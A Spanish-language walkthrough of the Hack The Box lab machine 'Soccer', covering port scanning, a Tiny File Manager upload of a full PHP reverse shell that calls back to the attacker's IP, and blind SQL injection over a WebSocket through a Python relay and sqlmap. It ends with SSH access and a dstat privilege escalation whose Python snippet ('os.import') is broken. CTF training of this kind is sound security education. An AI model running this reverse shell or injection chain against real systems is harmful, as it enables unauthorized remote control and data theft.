---
title: 'Soccer HTB - Walkthrough'
date: 2023-02-14
categories: [CFT, HTB]
img_path: /assets/images/
------

![soccer](1_8XZxVTFecE4QOhMMFA5VHg.png)

Lo primero que debemos realizar es introducir nuestro host e IP en el archivo de configuración */etc/hosts*
~~~ bash
echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts 
~~~

Luego escaneamos los puertos con **nmap**:

~~~ bash
❯ sudo grc nmap -T5 -O -A soccer.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 10:32 CET
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 10:33 (0:00:06 remaining)
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.083s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 13 Feb 2023 09:33:03 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 13 Feb 2023 09:33:03 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 13 Feb 2023 09:33:04 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=2/13%Time=63EA03C9%P=x86_64-unknown-linux-gnu
SF:%r(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Fou
SF:nd\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\
SF:r\nContent-Length:\x20139\r\nDate:\x20Mon,\x2013\x20Feb\x202023\x2009:3
SF:3:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x2
SF:0lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title
SF:>\n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")
SF:%r(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Securit
SF:y-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:0143\r\nDate:\x20Mon,\x2013\x20Feb\x202023\x2009:33:03\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>
SF:\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<
SF:pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16
SF:C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defa
SF:ult-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type
SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20
SF:Mon,\x2013\x20Feb\x202023\x2009:33:04\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charse
SF:t=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPT
SF:IONS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqT
SF:CP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   113.85 ms 10.10.16.1
2   36.51 ms  soccer.htb (10.10.11.194)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.19 seconds
~~~

Comprobamos que hay 3 puertos abiertos:
- **22 ->** SSH
- **80 ->** HTTP
- **9091 ->** xmltec-xmlmail?

Con el puerto 80 ya sabemos que hay una página web alojada en nuestra víctima, por lo que haremos un descubrimiento de directorios con gobuster:
~~~ bash
gobuster dir -u soccer.htb -w /usr/share/wordlists/Seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 1600
~~~
![gobuster](gbster.png)
Nos aparece que hay un directorio llamado */tiny*, por lo que nos dirigimos a este en nuestro navegador y comprobamos que es una página de login.
![login](login.png)
Si miramos las tecnologías existentes con la extensión*Wappalyzer* nos aprecerá *TinyFileManager*, por lo que si investigamos, encontraremos un CVE  
- Enlace [tinyfilemanagerexploit](https://github.com/febinrev/CVE-2021-45010-TinyFileManager-Exploit)

Por defecto las contraseñas y usuarios son:
- *admin -> admin@123*
- *user -> 12345*

Entraremos como administrador y nos dirigiremos a *Uploads* para poder crear una reverse shell, en nuestro archivo *.php* ingresamos:
~~~ php

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.1.7';  // Aquí pones tu dirección IP (tun0)
  $port = 4848;  // Puerto que vamos a usar
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
  

~~~

Ponemos el puerto 4848 en escucha (ya que a través de este se ejecutará y enviará 
el reverse shell)
~~~ bash
nc -nlvp 4848
~~~

Subimos el archivo y posteriormente abrimos y clicamos sobre *open*
![reverseshell](openreverseshell.php.png)

Luego de esto tendremos una reverse shell con el usuario *www-data*.

Vemos también con *Wappalyzer* que tiene como servidor web la tecnología de *nginx*, por lo que buscamos en todos los directorios este para comprobar donde se encuentran los archivos:
~~~ bash
find / -name "sites-enabled" 2>/dev/null | xargs -ls -l
~~~

Y nos aparece que en el directorio */etc/nginx/sites-enabled* se encuentran 2 archivos:
`lrwxrwxrwx 1 root root 34 Nov 17 08:06 default`
`lrwxrwxrwx 1 root root 41 Nov 17 08:39 soc-player.htb`

Veremos el contenido del archivo *soc-player.htb* y nos aparece que hay un subdominio para soccer.htb llamado *soc-player.soccer.htb*, por lo que lo volvemos a introducir en el archivo */etc/hosts/*  en la misma línea que soccer.htb
![soccpl](socplayer.png)

Al haberlo configurado todo, vemos que al introducir *soc-player.soccer.htb* nos aparecerá una nueva página.
![soccplht](socplayersoccerhtb.png)

Probemos la inyección de sql en el formulario de inicio de sesión. Pero primero, nuestra entrada es verificada por expresiones regulares en la interfaz, sin embargo, aún podemos ingresar la consulta sql usando *Burp Suite*.

Nos dirigiremos a la pestaña de Registro *Signup*, y nos creamos una cuenta (ya que no tenemos ninguna credencial de acceso), posteriormente en la pestaña de check se creará una websocket 
![socket](websocket.png)
El código anterior abre la conexión websocket. espera a que ingresemos el número de boleto y presione la tecla enter. Luego, envía datos json de nuestra entrada al servidor websocket. Si recibimos un mensaje, se mostrará en la pantalla, espera.

Recomiendo mirar este vídeo para enterarnos mejor:
<iframe width="560" height="315" src="https://www.youtube.com/embed/WTDqlunipXE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

Tal y como se muestra, necesitamos conectarnos mediante la opción de *repeater* de la Burp Suit a nuestro websocket y posteriormente iremos probando.

He comprobado si podía inyectar una consulta sql (*sql query*) y funcionó, ahora comprobamos si la web está usando 8sql. Si lo hace, devolverá "El boleto exitste"
> El identificador lo podremos ver si ingresamos algun texto o letra, más que nada para saber dónde introducir una consulta sql.
{: .prompt-tip }

![ticket](ticketexist.png)

Ahora usaremos Sqlmap
- Automatizando SQL injection a ciegas sobre WebSocket: [https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

Desde el código que se nos dió antes `ws://`  creamos un script de python3 y lo ejecutamos, mientras que en la otra terminal, haremos un sqlmap.

**Archivo sqli.py:**
~~~ python
from http.server import SimpleHTTPRequestHandler  
from socketserver import TCPServer  
from urllib.parse import unquote, urlparse  
from websocket import create_connection  
  
ws_server = "ws://soc-player.soccer.htb:9091/"  
  
def send_ws(payload):  
ws = create_connection(ws_server)  
# If the server returns a response on connect, use below line  
#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here  
  
# For our case, format the payload in JSON  
message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure  
data = '{"id":"%s"}' % message  
  
ws.send(data)  
resp = ws.recv()  
ws.close()  
  
if resp:  
return resp  
else:  
return ''  
  
def middleware_server(host_port,content_type="text/plain"):  
  
class CustomHandler(SimpleHTTPRequestHandler):  
def do_GET(self) -> None:  
self.send_response(200)  
try:  
payload = urlparse(self.path).query.split('=',1)[1]  
except IndexError:  
payload = False  
  
if payload:  
content = send_ws(payload)  
else:  
content = 'No parameters specified!'  
  
self.send_header("Content-type", content_type)  
self.end_headers()  
self.wfile.write(content.encode())  
return  
  
class _TCPServer(TCPServer):  
allow_reuse_address = True  
  
httpd = _TCPServer(host_port, CustomHandler)  
httpd.serve_forever()  
  
  
print("[+] Starting MiddleWare Server")  
print("[+] Send payloads in http://localhost:8081/?id=*")  
  
try:  
middleware_server(('0.0.0.0',8081))  
except KeyboardInterrupt:  
pass
~~~ 

- **Terminal1 ->** python3 sqli.py
- **Terminal2 ->** sqlmap -u 'http://localhost:8081/?id=1' -p "id" -batch
- ![sqlmap](sqlmap.png)

Nos aparecerá un usuario y contraseñas al usar `sqlmap -u "http://localhost:8081/?id=1" --batch --dbs`, por lo que nos conectamos mediante ssh:
~~~ bash
sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194
~~~

Ahora si listamos ya tendremos la flag de usuario, por lo que la introducimos en *Submit Flag* en HackTheBox.

Sólamente nos queda conseguir la flag del sistema, por lo que buscaremos  alguna aplicación que se pueda ejecutar como el usuario player pero que nos permita conectarnos a root.

Buscando encontramos que dstat se puede ejecutar y usa python como lenguaje, por lo que el directorio aunque sea */usr/share/dstat*, sólamente podemos añadir en */usr/local/share/dstat*, pero no pasa nada, símplemente creamos un script sencillo en python3, al que llamaremos *dstat_soccer.py*:
~~~ python
import os
os.import("/bin/sh")
~~~

Lo llevamos a /usr/local/share/dstat y, al terminar usamos *dstat --list*, para comprobar que está correctamente introducido, posteriormente ejecutamos lo siguiente:
~~~ bash
doas -u root /usr/bin/dstat --soccer
~~~

Y ya tendríamos al usuario **root**.